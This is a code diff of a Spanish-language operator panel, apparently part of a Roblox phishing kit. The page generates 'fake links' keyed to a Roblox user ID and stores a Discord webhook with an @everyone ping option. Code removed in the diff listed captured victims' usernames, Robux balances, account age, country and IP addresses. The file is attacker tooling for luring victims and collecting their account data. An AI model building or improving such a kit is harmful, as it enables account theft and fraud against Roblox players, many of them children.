+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel — NOVADYNAMICS</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Roboto,Arial,sans-serif}
+        body{background:#0F1012;color:#FFF;min-height:100vh;padding:20px}
+        h2{font-size:24px;margin-bottom:20px}
+        .caja{background:#1A1B1F;border-radius:12px;padding:20px;border:1px solid #2A2B2F;margin-bottom:16px}
+        input{width:100%;padding:12px;background:#242529;border:none;border-radius:8px;color:#FFF;font-size:16px;margin-bottom:12px;outline:1px solid #3A3C44}
+        input:focus{outline:2px solid #0085FF}
+        button{padding:12px 20px;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin:4px}
+        .btn-azul{background:#0085FF;color:#FFF}
+        .btn-gris{background:#2A2B2F;color:#FFF}
+        .enlace{background:#242529;padding:12px;border-radius:8px;word-break:break-all;margin:12px 0;display:none}
+        .fila{display:flex;justify-content:space-between;align-items:center;padding:10px 0}
+        .switch{width:50px;height:26px;background:#3A3C44;border-radius:13px;position:relative;cursor:pointer}
+        .switch.activo{background:#0085FF}
+        .switch::after{content:'';position:absolute;width:22px;height:22px;background:#FFF;border-radius:50%;top:2px;left:2px}
+        .switch.activo::after{transform:translateX(24px)}
+        .ok{color:#34C759}
+        .mal{color:#ED2939}
+    </style>
+</head>
+<body>
+
+<h1>🔧 Panel NOVADYNAMICS</h1>
+
+<div class="caja">
+    <h3>🔗 Generar Enlace Falso</h3>
+    <input type="text" id="usuarioLink" placeholder="ID o Usuario de Roblox">
+    <button class="btn-azul" onclick="generar()">✅ Generar</button>
+    <div class="enlace" id="enlaceOut"></div>
+    <button class="btn-gris" id="btnCopiar" onclick="copiar()" style="display:none">📋 Copiar Enlace</button>
+</div>
+
+<div class="caja">
+    <h3>⚙️ Configuración Webhook</h3>
+    <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
+    <button class="btn-azul" onclick="guardar()">✅ Guardar</button>
+    <button class="btn-gris" onclick="borrar()">🗑️ Borrar</button>
+    <p id="estado" style="margin-top:10px">⚠️ Sin configurar</p>
+    <div class="fila">
+        <span>🔔 Mensaje @everyone</span>
+        <div class="switch" id="swTodos" onclick="this.classList.toggle('activo');localStorage.setItem('todos',this.classList.contains('activo')?'1':'0')"></div>
+    </div>
+</div>
+
+<script>
+let enlaceGenerado='';
+
+function generar(){
+    const u=document.getElementById('usuarioLink').value.trim();
+    if(!u){alert('Escribe un usuario o ID');return;}
+    const base=window.location.origin+window.location.pathname.replace('panel.html','');
+    enlaceGenerado=base+'?u='+encodeURIComponent(u);
     document.getElementById('enlaceOut').style.display='block';
-    document.getElementById('enlaceOut').textContent = enlaceGenerado;
+    document.getElementById('enlaceOut').textContent=enlaceGenerado;
     document.getElementById('btnCopiar').style.display='inline-block';
-    alert('✅ Enlace generado:\n' + enlaceGenerado);
+    alert('✅ Enlace generado:\n'+enlaceGenerado);
 }
 
-function copiarEnlace(){
-    navigator.clipboard.writeText(enlaceGenerado)
-        .then(()=>alert('✅ ¡Enlace copiado!'));
+function copiar(){
+    navigator.clipboard.writeText(enlaceGenerado).then(()=>alert('✅ ¡Copiado!'));
 }
 
-function guardarWebhook(){
-    const u = document.getElementById('webhookUrl').value.trim();
-    const e = document.getElementById('estadoWebhook');
+function guardar(){
+    const u=document.getElementById('webhookUrl').value.trim();
     if(!u.startsWith('https://discord.com/api/webhooks/')){
-        e.textContent='❌ Enlace no válido';
-        e.className='estado-mal';
+        document.getElementById('estado').textContent='❌ Enlace inválido';
+        document.getElementById('estado').className='mal';
         return;
     }
-    localStorage.setItem('webhook', u);
-    e.textContent='✅ Webhook guardado';
-    e.className='estado-ok';
-    alert('✅ Guardado correctamente');
+    localStorage.setItem('webhook',u);
+    document.getElementById('estado').textContent='✅ Guardado';
+    document.getElementById('estado').className='ok';
+    alert('✅ Webhook guardado');
 }
 
-function borrarWebhook(){
+function borrar(){
     localStorage.removeItem('webhook');
     document.getElementById('webhookUrl').value='';
-    const e = document.getElementById('estadoWebhook');
-    e.textContent='⚠️ No configurado';
-    e.className='';
+    document.getElementById('estado').textContent='⚠️ Sin configurar';
+    document.getElementById('estado').className='';
 }
 
-function cargarWebhook(){
-    const w = localStorage.getItem('webhook');
-    const e = document.getElementById('estadoWebhook');
-    if(w){
-        document.getElementById('webhookUrl').value=w;
-        e.textContent='✅ Webhook guardado';
-        e.className='estado-ok';
-    }
-    if(localStorage.getItem('todos')==='1'){
-        document.getElementById('swTodos').classList.add('activo');
-    }
-}
-
-function actualizarPanel(){
-    let tr=0;
-    registros.forEach(r=>{ tr+=r.robux||0; });
-    document.getElementById('robuxSum').textContent = tr.toLocaleString();
-    document.getElementById('cuentasTot').textContent = registros.length;
-
-    const tb = document.getElementById('tablaBody');
-    if(registros.length===0){
-        tb.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>';
-        return;
-    }
-    tb.innerHTML = registros.map(r=>`
-        <tr>
-            <td>${r.usuario}</td>
-            <td>${r.robux}</td>
-            <td>${r.dias}</td>
-            <td>${r.pais}</td>
-            <td>${r.ip}</td>
-        </tr>
-    `).join('');
+window.onload=()=>{
+    const w=localStorage.getItem('webhook');
+    if(w){document.getElementById('webhookUrl').value=w;document.getElementById('estado').textContent='✅ Guardado';document.getElementById('estado').className='ok';}
+    if(localStorage.getItem('todos')==='1') document.getElementById('swTodos').classList.add('activo');
 }
 </script>
 </body>
